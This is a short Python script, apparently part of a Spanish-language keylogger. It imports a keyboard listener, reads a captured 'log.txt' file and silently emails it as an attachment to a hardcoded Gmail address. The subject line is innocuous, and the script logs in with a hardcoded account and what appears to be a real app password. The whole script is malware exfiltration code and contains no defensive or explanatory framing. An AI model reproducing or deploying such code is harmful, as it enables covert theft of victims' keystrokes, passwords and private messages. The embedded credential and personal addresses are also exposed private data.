from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
import sys

mensaje = MIMEMultipart("plain")
mensaje["From"] = "fokolotorolo@gmail.com"
mensaje["To"] = "felipe.morgado2000@gmail.com"
mensaje["Subject"] = "Un lindo correo electronico"

adjunto = MIMEBase("application", "octect-stream")
adjunto.set_payload(open('log.txt', 'rb').read())
adjunto.add_header("content-Disposition", 'attachment; filename = "log.txt"')
mensaje.attach(adjunto)

server = SMTP("smtp.gmail.com:587")
server.starttls()
server.login("fokolotorolo@gmail.com", "uczb gctp ksya xzul")
server.sendmail("fokolotorolo@gmail.com", "felipe.morgado2000@gmail.com", mensaje.as_string().encode('utf-8'))

server.quit()